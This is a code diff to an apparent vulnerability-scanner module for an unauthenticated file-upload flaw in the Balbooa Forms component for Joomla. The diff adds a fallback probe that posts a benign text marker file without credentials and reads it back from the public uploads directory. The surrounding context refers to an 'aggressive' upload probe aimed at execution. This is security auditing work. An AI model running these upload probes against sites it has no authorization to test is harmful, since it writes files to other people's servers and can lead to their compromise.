@@ -136,7 +136,10 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
         timeout=timeout,
         proxy=proxy,
     )
-    proof_candidates = [f"{PUBLIC_UPLOAD_DIR}{urllib.parse.quote(filename)}"]
+    proof_candidates = [
+        f"{PUBLIC_UPLOAD_DIR}form-0/{urllib.parse.quote(filename)}",
+        f"{PUBLIC_UPLOAD_DIR}{urllib.parse.quote(filename)}",
+    ]
     proof, found_path, attempts = poll_paths(
         lambda p: request(f"{base}{p}", timeout=timeout, proxy=proxy),
         proof_candidates,
@@ -185,6 +188,59 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
                 action=f"Delete {filename}, inspect for compromise, and upgrade Balbooa Forms to {FIXED_RULE}.",
             )
 
+    # Fallback: benign marker upload. Modern Joomla stacks gate unsafe files
+    # in the framework input layer (isSafeFile), so a literal .php never
+    # reaches the component there; a benign .txt still proves the
+    # component-layer flaw (no auth/token/allow-list) when stored publicly.
+    marker = f"PROOFCMS_BAFORMS_{rand_str(12)}"
+    txt_name = f"jvh-baforms-{rand_str(8)}.txt"
+    txt_content = f"ProofCMS authorized audit marker {marker}\n"
+    txt_type, txt_body = build_multipart(
+        {"title": "ProofCMS Lab Test", "id": "0", "field_id": "0"},
+        {"file": (txt_name, txt_content, "text/plain")},
+    )
+    txt_upload = request(
+        upload_url,
+        method="POST",
+        headers={"Content-Type": txt_type},
+        data=txt_body,
+        timeout=timeout,
+        proxy=proxy,
+    )
+    txt_upload_status = txt_upload.get("status", 0)
+    txt_candidates = [
+        f"{PUBLIC_UPLOAD_DIR}form-0/{urllib.parse.quote(txt_name)}",
+        f"{PUBLIC_UPLOAD_DIR}{urllib.parse.quote(txt_name)}",
+    ]
+    txt_proof, txt_found, txt_attempts = poll_paths(
+        lambda p: request(f"{base}{p}", timeout=timeout, proxy=proxy),
+        txt_candidates,
+        deadline=3.0,
+        initial_delay=0.1,
+        accept_fn=lambda candidate: marker in (candidate.get("body", "") or ""),
+    )
+    if txt_proof and txt_proof.get("status") == 200:
+        txt_url = f"{base}{txt_found}" if txt_found else f"{base}{txt_candidates[0]}"
+        return Finding(
+            cve=CVE_ID,
+            name=NAME,
+            status="VULNERABLE_UPLOAD_ONLY",
+            confidence="CONFIRMED",
+            component=COMPONENT,
+            affected_rule=AFFECTED_RULE,
+            exploit_available=HAS_EXPLOIT,
+            exploit_ran=True,
+            proof_url=txt_url,
+            uploaded_filename=txt_name,
+            detail=(
+                "Unauthenticated marker upload was accepted and read back byte-identical from the public "
+                f"uploads directory after {txt_attempts} attempt(s), confirming the missing auth/token/allow-list "
+                "gate. A literal .php does not reach the component on this stack (framework isSafeFile input gate); "
+                "execution is server-dependent and no executable content was uploaded."
+            ),
+            action=f"Delete {txt_name} (and {filename} if present), inspect for compromise, and upgrade Balbooa Forms to {FIXED_RULE}.",
+        )
+
     return Finding(
         cve=CVE_ID,
         name=NAME,
@@ -198,10 +254,11 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
         uploaded_filename=filename,
         detail=(
             "Aggressive lab upload probe did not confirm execution. "
-            f"Upload status: {upload.get('status')}; proof status: {proof.get('status') if proof else 'not-found'}."
+            f"Upload status: {upload.get('status')}; proof status: {proof.get('status') if proof else 'not-found'}; "
+            f"marker upload status: {txt_upload_status}."
         ),
         action=(
-            f"If the file was uploaded, delete {filename}. Verify server logs and upgrade Balbooa Forms to {FIXED_RULE}."
+            f"If files were uploaded, delete {filename} and {txt_name}. Verify server logs and upgrade Balbooa Forms to {FIXED_RULE}."
         ),
     )
 
@@ -244,9 +301,9 @@ def metadata() -> dict:
         "exploit_available": HAS_EXPLOIT,
         "exploit_modes": EXPLOIT_MODES,
         "intrusive": INTRUSIVE,
-        "module_version": "1.2.0",
-        "last_reviewed": "2026-03-20",
-        "updated": "2026-03-20",
+        "module_version": "1.3.0",
+        "last_reviewed": "2026-11-11",
+        "updated": "2026-11-11",
         "required_detectors": ["baforms"],
         "references": [
             "https://www.balbooa.com/joomla-forms",
